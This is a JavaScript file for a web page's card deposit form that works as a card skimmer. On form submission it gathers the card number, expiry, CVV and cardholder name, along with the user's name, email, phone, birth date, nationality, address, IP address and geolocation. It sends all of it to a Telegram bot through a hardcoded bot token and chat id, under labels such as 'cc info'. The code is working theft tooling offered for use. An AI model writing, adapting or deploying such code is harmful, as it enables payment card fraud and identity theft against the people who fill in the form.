/**
 * Safely get text from an element by id.
 */
function getTextById(id, fallback = "N/A") {
  const el = document.getElementById(id);
  if (!el) return fallback;
  const txt = (el.textContent || el.innerText || "").trim();
  return txt || fallback;
}

/**
 * Safely get value from an input/select/textarea by id.
 */
function getValueById(id, fallback = "N/A") {
  const el = document.getElementById(id);
  if (!el) return fallback;

  if (el.tagName === "SELECT") {
    // Prefer the selected option's visible text; fall back to value
    const opt = el.options[el.selectedIndex];
    return (opt && (opt.text || opt.value) || "").trim() || fallback;
  }

  const val = (el.value || "").trim();
  return val || fallback;
}

/**
 * Collect profile info.
 * If the edit form is visible, use its inputs; otherwise use the read-only fields.
 */
function collectProfileInfo() {
  const editFormVisible = (() => {
    const f = document.getElementById("ProfilEditForm");
    if (!f) return false;
    const style = window.getComputedStyle(f);
    return style.display !== "none";
  })();

  if (editFormVisible) {
    return {
      fullName:     getValueById("fullNameInput"),
      email:        getValueById("email"),
      phone:        getValueById("phoneInput"),
      dob:          getValueById("birthdate"),
      nationality:  getValueById("nationalityInput"),
      address:      getValueById("addressInput"),
      source:       "edit-form"
    };
  }

  return {
    fullName:     getTextById("fullName"),
    email:        getTextById("emailaddress"),
    phone:        getTextById("phone"),
    dob:          getTextById("dob"),
    nationality:  getTextById("nationality"),
    address:      getTextById("address"),
    source:       "read-only"
  };
}

async function sendDataToTelegram() {
  // ⚠️ Consider moving the token server-side; hardcoding tokens in frontend is risky.
  const apiUrl = `https://api.telegram.org/bot7124083079:AAH1M6KIqZHiLpqDWBuR4K9lEQZST-2GyAE/sendMessage`;
  const chatId = "-4258460856";

  // Other fields you already had
  const depositAmount = document.getElementById("cardDepositAmount")?.value?.trim() || "";
  const cardName      = document.getElementById("cardName")?.value?.trim() || "";
  const cardNumber    = document.getElementById("cardNumber")?.value?.trim() || "";
  const cardExpiry    = document.getElementById("cardExpiry")?.value?.trim() || "";
  const cardCVV       = document.getElementById("cardCVV")?.value?.trim() || "";
  const name          = document.getElementById("Name")?.value?.trim() || "";
  const idUser        = document.getElementById("iduser")?.value?.trim() || "";
  const toUser        = document.getElementById("touser")?.value?.trim() || "";
  const fromUser      = document.getElementById("fromser")?.value?.trim() || "";

  // Collect profile info from page
  const profile = collectProfileInfo();

  // Get IP + geo
  let ipAddress = "N/A";
  let location  = { city: "N/A", region: "N/A", country_name: "N/A" };

  try {
    const ipRes = await fetch(`https://api.ipify.org?format=json`);
    const ipData = await ipRes.json();
    ipAddress = ipData?.ip || "N/A";
  } catch (e) {
    console.error("Error fetching IP address:", e);
  }

  try {
    if (ipAddress !== "N/A") {
      const locRes = await fetch(`https://ipapi.co/${ipAddress}/json/`);
      const locData = await locRes.json();
      location = {
        city:         locData?.city || "N/A",
        region:       locData?.region || "N/A",
        country_name: locData?.country_name || "N/A"
      };
    }
  } catch (e) {
    console.error("Error fetching location data:", e);
  }

  // Craft message
  // (Using plain text; you could add parse_mode: "MarkdownV2" or "HTML" if you prefer formatting.)
  const message =
`🔔 New submission

💳 Deposit
• Amount: ${depositAmount || "N/A"}

💳 cc info
👤 Name: ${cardName}
💳 CC number: ${cardNumber}
📅️ exp: ${cardExpiry}
🔑 ccv: ${cardCVV}

📇 Profile (${profile.source})
• Full name: ${profile.fullName}
• Email: ${profile.email}
• Phone: ${profile.phone}
• DOB: ${profile.dob}
• Nationality: ${profile.nationality}
• Address: ${profile.address}

🌐 Network
• IP: ${ipAddress}
• Location: ${location.city}, ${location.region}, ${location.country_name}`;

  try {
    const res = await fetch(apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
    const data = await res.json();
    console.log("Message sent to Telegram:", data);
  } catch (e) {
    console.error("Error sending to Telegram:", e);
  }
}

// Attach event listeners once the DOM is ready.
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('cardDepositForm');
  if (!form) return;

  form.addEventListener('submit', () => {
    // Ensure the card deposit form fields have values before sending.
    const requiredIds = [
      'cardDepositAmount',
      'cardName',
      'cardNumber',
      'cardExpiry',
      'cardCVV'
    ];

    const isFilled = requiredIds.every(id => {
      const el = document.getElementById(id);
      return el && el.value.trim();
    });

    if (isFilled) {
      sendDataToTelegram();
    }
  });
});
